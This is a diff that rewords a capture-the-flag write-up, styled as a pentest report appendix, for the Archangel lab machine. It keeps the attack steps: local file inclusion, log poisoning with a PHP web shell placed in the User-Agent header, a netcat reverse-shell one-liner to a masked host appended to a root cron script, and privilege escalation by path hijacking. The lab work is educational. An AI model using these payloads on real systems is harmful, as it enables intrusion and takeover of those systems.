@@ -129,13 +129,13 @@ Applying the remediation steps outlined in this report would significantly reduc
 
 # 10. Appendix A – Proof of Concept (Full Command & Output Log)
 
-Let's begin by exporting the IP in the environment variable as 'target':
+Exporting the IP in the environment variable as 'target':
 ```
 export target=10.10.96.236
 ```
 ![](https://github.com/user-attachments/assets/a4d36a51-ee75-4c94-a48c-95f755da9d7d)
 
-And by scanning with nmap:
+Scanning with nmap:
 ```
 nmap -sC -sV $target
 ```
@@ -233,14 +233,14 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 
 
 
-Now it's time to fire up BurpSuite.
-We'll put the php web shell in the User-Agent string:
+Using BurpSuite.
+We will put the php web shell in the User-Agent string:
 ```
 <?php echo system($_GET['cmd']); ?>
 ```
 ![](https://github.com/user-attachments/assets/2cf45042-de12-4575-aba6-f3416c552bbc)
 
-And we'll try if it's working by injecting `&cmd=whoami` in the URL:
+And we will try if it's working by injecting `&cmd=whoami` in the URL:
 ```
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami
 ```
@@ -260,16 +260,16 @@ GET test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//
 
 
 
-It's time to fire up netcat and visit `mafialive.thm/shell.php` to trigger the shell.
+Set a netcat listener and visit `mafialive.thm/shell.php` to trigger the shell.
 ![](https://github.com/user-attachments/assets/73bd663a-6950-40c9-aa21-590e9f6c3166)
 
-And...we're in!
+Successfully obtained foothold as `www-data`
 ```
 whoami: 
 www-data
 ```
 
-Let's stabilize the shell:
+Stabilizing the shell:
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm-color
@@ -280,7 +280,7 @@ Now we're ready to search for the third flag, the one of the first user (www-dat
 
 
 
-Let's do some cron enumeration:
+Cron enumeration:
 ```
 cat /etc/crontab
 ```
@@ -296,10 +296,9 @@ We will echo this one liner into the file and wait for the execution by root:
 ```
 echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.xx.xx.xx 4445 >/tmp/f" >> helloworld.sh
 ```
-(Activate netcat in another terminal on port 4445)
-And obviously, we will stabilize the shell again and search for the flag of the user archangel.
+(Activate a netcat listener in another terminal on port 4445)
+We will stabilize the shell again and search for the flag of the user archangel.
 ![](https://github.com/user-attachments/assets/f8ad5060-bc0f-4ff5-9262-a05c0ac7ebfa)
-
 
 
 In the same folder of the flag, we can find a file named `backup` owned by root on which we have write permission. if we `strings` the file we can see that the file `cp` all the files of the `/home/user/archangel/myfiles/*` folder into `/opt/backupfiles`.
@@ -335,7 +334,7 @@ Execute the command:
 
 ![](https://github.com/user-attachments/assets/ee3846c6-f848-43c4-8d29-414418c82a61)
 
-You are now root!
+Escalation of privileges to `root` was obtained through path hijacking.
 
 
 
